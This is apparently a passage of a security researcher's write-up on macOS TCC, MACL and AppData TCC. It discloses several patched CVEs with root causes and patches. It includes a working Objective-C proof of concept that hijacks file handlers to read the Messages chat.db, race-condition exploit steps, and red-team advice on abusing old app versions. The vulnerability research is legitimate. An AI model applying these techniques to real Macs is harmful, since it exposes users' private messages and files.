Traditionally, an arbitrary folder creation vulnerability is considered harmless and cannot lead to any exploitable outcome.



However, on macOS, by combining some exploit methods to modify the quarantine flag, such a seemingly useless vulnerability can be transformed into a universal sandbox escape.



When I analyzed how Apple implemented the App Sandbox on macOS, I discovered the arbitrary folder creation vulnerability. At that time, I considered it an unexploitable vulnerability. However, as my understanding of macOS security deepened, I realized it could be exploited. I then spent two weeks figuring out how to exploit it. As a security researcher, please do not ignore any seemingly insignificant vulnerabilities, especially when analyzing a new OS.



Additionaly, I believe the system still contains many APIs that allow for unauthorized folder creation.



Enjoy！Good luck for your bug hunting！



<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-152618.png" style="zoom:50%; display: block; margin: 0 auto;" />



---



## **3. A Permission Granting Mechanism on macOS**

Next, we need to discuss the newly introduced AppData TCC in macOS 14 as it hinders our previous exploit

Before that, we first need to understand a crucial permission granting mechanism on macOS, `MACL（Mandatory Access Control List ）`

AppData TCC is based on `MACL`



### **3.1 What does the MACL look like?**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173729.png" style="zoom:50%; display: block; margin: 0 auto;" />



Image that, if we are the developer, there are two different ways to limit file access:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-170810.png" style="zoom:30%; display: block; margin: 0 auto;" />



Obviously, the second one is the better choose.

Upon analysis, macOS does use the second one. The OS will tag the file with the MACL attribute, which contains all authorized processes that can access the file.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173835.png" style="zoom:50%; display: block; margin: 0 auto;" />



### **3.2 GuluBadFinder : CVE-2023-42850**

The vulnerability had existed for years.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture23.png" style="zoom:40%; display: block; margin: 0 auto;" />

- Finder uses the default app to open the file based on its Uniform Type Identifier
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture24.png" style="zoom:40%; display: block; margin: 0 auto;" />
- macOS generates the MACL attribute to allow the default app to access the file
- Finder informs the app to open the file



**For example:**

- If we execute `open -a TextEdit ~/Documents/flag.txt`, we will get an error
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture25.png" style="zoom:50%; display: block; margin: 0 auto;" />
- But if we execute `open -a Finder ~/Documents/flag.txt`, `TextEdit` can open the protected file
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture26.png" style="zoom:50%; display: block; margin: 0 auto;" />

If we can replace the default file handler, we can trick Finder into automatically granting our application access to any file when it opens the file.

We can use this method to access arbitrary files, like `Safari/History.db`, `Messages/Chat.db` and etc.

**NOTES:**

We cannot use this method to access `TCC.db`.



**PoC:**

1. The malicious app can register supported file types in `Info.plist` in this way:
   - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture27.png" style="zoom:50%; display: block; margin: 0 auto;" />
2. We can use [SwiftDefaultApps](https://github.com/Lord-Kamina/SwiftDefaultApps) change the default file handlers. 
   - The UTI of Database is `dyn.ah62d4rv4ge80k2u`

```objective-c
#import <Cocoa/Cocoa.h>
#import <Foundation/Foundation.h>
#import <sqlite3.h>

@interface AppDelegate : NSObject <NSApplicationDelegate>

@end

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    NSLog(@"cppoctag: applicationDidFinishLaunching");
    NSTask *init_task = [[NSTask alloc] init];
    [init_task setLaunchPath:@"/bin/sh"];
    
    NSArray *init_arguments = @[@"-c", @"/Applications/poc.app/Contents/MacOS/swda setHandler --UTI dyn.ah62d4rv4ge80k2u --app com.example.poc"];
    [init_task setArguments:init_arguments];
    
    [init_task launch];
    [init_task waitUntilExit];

    NSLog(@"cppoctag: Init with swda");


    NSTask *exec_task = [[NSTask alloc] init];
    [exec_task setLaunchPath:@"/bin/sh"];
    
    NSArray *exec_arguments = @[@"-c", @"open -a Finder ~/Library/Messages/chat.db"];
    [exec_task setArguments:exec_arguments];
    
    [exec_task launch];
    [exec_task waitUntilExit];
    NSLog(@"exec_task");
}


- (void)application:(NSApplication *)application openFiles:(NSArray<NSString *> *)filePaths {
    for (NSString *filePath in filePaths) {
        NSFileManager *fileManager = [NSFileManager defaultManager];
        if ([fileManager fileExistsAtPath:filePath]) {
            // Read the file data
            NSData *data = [NSData dataWithContentsOfFile:filePath];
            
            if (data != nil) {
                // Get the file name and extension from the path
                NSString *fileName = [filePath lastPathComponent];
                
                // Create the destination path
                NSString *destinationPath = [NSString stringWithFormat:@"/tmp/%@", fileName];
                
                // Write the data to the destination path
                [data writeToFile:destinationPath atomically:YES];
                NSLog(@"cppoctag: success");
            } else {
                NSLog(@"cppoctag: Failed to read data from file at %@", filePath);
            }
        } else {
            NSLog(@"cppoctag: No file found at %@", filePath);
        }
    }

    sqlite3 *db;
    sqlite3_stmt *stmt;
    
    NSString *dbPath = @"/tmp/chat.db";
    NSString *query = @"SELECT text FROM message WHERE ROWID = 1";
    const char *dbPathUTF8 = [dbPath UTF8String];
    const char *queryUTF8 = [query UTF8String];
    
    int rc = sqlite3_open(dbPathUTF8, &db);
    if (rc != SQLITE_OK) {
        NSLog(@"cppoctag: Cannot open database: %s", sqlite3_errmsg(db));
        return;
    }
    
    rc = sqlite3_prepare_v2(db, queryUTF8, -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        NSLog(@"cppoctag: Failed to prepare statement: %s", sqlite3_errmsg(db));
        return;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char *text = sqlite3_column_text(stmt, 0);
        if (text != NULL) {
            NSString *textStr = [NSString stringWithUTF8String:(const char *)text];
            NSLog(@"cppoctag: Text: %@", textStr);
            
            NSString *appleScriptCode = [NSString stringWithFormat:@"display dialog \"%@\"", textStr];
            NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:appleScriptCode];
            NSDictionary *errorDict;
            [appleScript executeAndReturnError:&errorDict];
            
            if (errorDict) {
                NSLog(@"cppoctag: AppleScript Error: %@", errorDict);
            }
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

@end

int main(int argc, const char * argv[]) {
    NSLog(@"cppoctag: Start");
    AppDelegate *appDelegate = [[AppDelegate alloc] init];
    NSApplication *application = [NSApplication sharedApplication];
    [application setDelegate:appDelegate];
    [application run];
    return 0;
}
```

<video width="640" height="360" controls>
  <source src="{{ site.url }}/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/video4.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

### **3.3 The Role of MACL**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-154624.png" style="zoom:50%; display: block; margin: 0 auto;" />

I will take a dive into MACL in the next section.



### **3.4 Unpatched Vulnerabilities: 5** 

I planned to disclose more, but they are under patching, so I will disclose them in the future session.



---



## **4. Everything you need to know about AppData TCC**

- When a sandboxed app launches, Secinitd requests ContainerManagerd to create a private container folder in `~/Library/Containers` for this app based on its bundle ID.
- For example: `~/Library/Containers/gulucat.HelloMac/Data`
- The Data folder is the actual private container folder for the app.
- It has the `MACL` attribute, which contains information about all apps allowed to access it.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-155028.png" style="zoom:50%; display: block; margin: 0 auto;" />



### **4.1 How to generate MACL: Based on macOS 14.5**

 Secinitd registers the app container and applies MACL to the Data folder.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-155207.png" style="zoom:70%; display: block; margin: 0 auto;" />



**There are two different routes to generate the MACL attribute:**

- `Trusted processes` can access its private container folder
- `Apps developed by the same developer` can access its private container folder

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-155331.png" style="zoom:50%; display: block; margin: 0 auto;" />



**Route 1 Demo :**

`Info.plist of WeChat`

WeType can access WeChat’s private container folder

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture29.png" style="zoom:50%; display: block; margin: 0 auto;" />



**Route 2 :**

For route 2, it will obtain the teamID of the launching sandboxed app and register exceptions that allow all apps and installation packages from the same team to access the folder.

The sandbox kernel extension handles the syscall.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-155616.png" style="zoom:50%; display: block; margin: 0 auto;" />



**Analyze Sandbox.kext:**

Sandbox kernel extension has some verifications.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-174021.png" style="zoom:50%; display: block; margin: 0 auto;" />

And it will generate the MACL attribute based on different types:

- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-174113.png" style="zoom:50%; display: block; margin: 0 auto;" />
- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-160501.png" style="zoom:50%; display: block; margin: 0 auto;" />
- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-160507.png" style="zoom:50%; display: block; margin: 0 auto;" />
- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-160514.png" style="zoom:50%; display: block; margin: 0 auto;" />

Actually these MACL generation strategies are essentially similar, all involving SHA-256 hash calculations with some differences in the details.

- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-160638.png" style="zoom:50%; display: block; margin: 0 auto;" />



### **4.2 Abuse AppData TCC**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-174201.png" style="zoom:50%; display: block; margin: 0 auto;" />



#### **4.2.1 GuluBadContainerManager : CVE-2023-42932**

This is the first vulnerability.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-174234.png" style="zoom:50%; display: block; margin: 0 auto;" />

**Root cause:**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-161028.png" style="zoom:50%; display: block; margin: 0 auto;" />



**Patch:**

Now, if the Data folder is a symbolic link, ContainerManagerd will block its launch.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-174315.png" style="zoom:50%; display: block; margin: 0 auto;" />



#### **4.2.2 GuluBadContainerManager2 : CVE-2024-23215**

This is the second vulnerability.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-174349.png" style="zoom:40%; display: block; margin: 0 auto;" />

**Root cause:**

- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-161307.png" style="zoom:50%; display: block; margin: 0 auto;" />
- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-161316.png" style="zoom:50%; display: block; margin: 0 auto;" />

- `~/Library/Staging` was not protected by TCC. Anyone could access it
- Race Condition vulnerability here
- Before renaming, we could replace the `{RANDOM_UUID}/Data` folder with a symbolic link 
- As a result, the victim folder would be tagged with the malicious sandboxed app’s MACL attribute

**Patch:**

- `~/Library/Staging` moves to `~/Library/ContainerManager/Staging`

- The folder is protected by TCC and we cannot access the temporary files any more

  

#### **4.2.3 GuluBadContainerManager3 : CVE-2024-27872**

The third vulnerability is a security patch bypass vulnerability,   which allows us to bypass the patch for the previous two vulnerabilities. Apple patched the vulnerability last month.



The initialization process of the app's sandbox container is very complex, involving many high-privilege processes and frameworks, such as `Secinitd, AppContainer, AppSandbox, ContainerManagerd, and Sandbox.kext`.

Complicated often means bugs:

- `Secinitd` first requests `ContainerManagerd` to create the app container folder.
- After the creation, `Secinitd` will request `Sandbox.kext` to update the `MACL` attribute of the `Data` folder
- And there is a timing window between the `unprotected` and `protected` statuses.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-161827.png" style="zoom:50%; display: block; margin: 0 auto;" />



**PoC :**

- Monitor Data folder creation; if found, replace it with a symbolic link
- At this time, `ContainerManagerd` prevents the launch of the malicious sandboxed app due to the patch for `GuluBadContainerManager CVE-2023-42932`
- But `Secinitd` still requests `Sandbox.kext` to update the `Data` folder's MACL attribute 
- As a result, the folder pointed to by the symbolic link has been erroneously assigned the `MACL` attribute



Currently, we cannot continue the exploit because the patch will prevent the app from launching.

However, a crucial detail is that the victim folder has been tagged with a malicious `MACL` attribute.



So then we need to replace the symbolic link with a normal Data folder so that the next time we launch the malicious sandboxed app, `ContainerManagerd` won’t block it.

After this, the malicious sandboxed app launched, but we will find that it cannot access the victim folder due to sandbox restrictions.

If a sandboxed app wants to access some resources, `Sandbox.kext` will first check its sandbox restrictions. If allowed, `TCCD` will check if the process has access to the protected folder. 

`MACL` can help us bypass the TCC limitation, and we need to break the sandbox restrictions too.

Therefore, when we compile the app, we need to register the `sbpl` to break the sandbox restrictions:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-162121.png" style="zoom:50%; display: block; margin: 0 auto;" />



<video width="640" height="360" controls>
  <source src="{{ site.url }}/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/video5.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

#### **4.2.4 Other vulnerabilities : 3**

There are 3 relevant vulnerabilities. 

2 of them have been patched, and the remaining one is in the process of being patched.Their impacts are lower than the three vulnerabilities mentioned above; they can only be used to steal the specific app's content or all sandboxed apps' content. We cannot use them to access arbitrary files with nearly FDA-Level permission.

I may disclose them later.



### **4.3 Hello macOS 15**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-163329.png" style="zoom:50%; display: block; margin: 0 auto;" />



### **4.4 Have You Identified an Attack Surface in AppData TCC ?**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture30.png" style="zoom:50%; display: block; margin: 0 auto;" />



The purpose of AppData TCC is to protect the data of 3rd applications. 

Logically, this approach is sound; it has an allow list to limit access. Only trusted applications can access the protected container folder.

**But, it doesn’t provide developers with an option to create a blocklist.**



From a system design perspective, the purpose of an allowlist is different from that of a blocklist.

If you only have an allowlist without a blocklist, what happens if a trusted app is no longer trusted? What happens?

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-163722.png" style="zoom:50%; display: block; margin: 0 auto;" />

- If any trusted application has an N-Day vulnerability, like the dylib hijacking vulnerability, the attacker can download the old version, achieve LPE, and then access the sensitive files of the latest app
- A vulnerability that only affected specific versions has turned into a persistent issue that developers cannot fix



**Allowlist Can Not Block This Exploit.**

The developer can configure the allowlist to limit who can access the folder, but it can not block this exploit 

- The allowlist is a way to allow other processes to access the sandboxed app’s private container folder. Whatever the configuration is, the sandboxed app itself can still access the private container folder
- Even if the allowlist works, it only compares the teamID in the allowlist. The vulnerable older version of the sandboxed app has a valid teamID, so you cannot block its launch



**To Red Teams:**

>  Collect these vulnerable old version apps

- Achieve RCE on the victim's macOS, intending to escalate privileges or steal sensitive data, but discover that the data is protected by AppData TCC
- The protected data is guarded by a sandboxed app, and the latest version is secure with no LPE vulnerabilities 
- However, an older, vulnerable version can still be exploited. Download the vulnerable app to the victim's macOS to achieve LPE 



**To Apple : Suggestions**

1. Create a blocklist 
   - If the app has an n-day vulnerability, developers can add the vulnerable app's cdhash to the blocklist
     These blocked older version apps cannot access the latest app's private container folder
2. If the current running app version is lower than the version that was last run, prompt the user with an alert



**TCCD Has a Similar Attack Surface:**

- If an application has had multiple privilege escalation vulnerabilities in its history, it is advisable not to grant excessive TCC permissions to that application for security reasons
- Apple has introduced several security mechanisms, such as trustcache, to address these issues 
- However, these mechanisms currently focus mainly on the security of Apple's apps and do not yet cover third-party apps



---



## **5. Summary**

### **5.1 Unpatch vulnerabilities : Over 30**

Now, I have achieved RCE and I can read / write arbitrary files. I should talk about the Root LPE, General TCC bypass and SIP bypass. 

I planned to disclose some of them but they are under patching so I will disclose them in the future session.

Here's a demo of General TCC bypass on the latest macOS 15.0 :

<video width="640" height="360" controls>
  <source src="{{ site.url }}/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/video6.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>



### **5.2 Takeaways**

- Finding an arbitrary folder creation vulnerability on macOS is equivalent to finding a sandbox escape vulnerability
- MACL: A permission granting mechanism on macOS
- Everything you need to know about AppData TCC
- Abusing N-Day vulnerabilities in outdated versions of installed third-party apps to bypass TCC



---



## **The End**

In my presentation, I disclosed some methods to achieve SBX and LPE. Many of them require launching an app, so in an attack scenario, the user may notice an app icon briefly flashing in the Dock as it appears and disappears quickly, which might not be ideal for weaponization.  

**Actually there are some tricks to hide the icon and exploit these vulnerabilities silently, without any notifications**. 

Since many vulnerabilities are currently being patched, disclosing these tricks might cause harm to users, so I may disclose them next year. Or you can try them yourself : )



Thanks for reading.

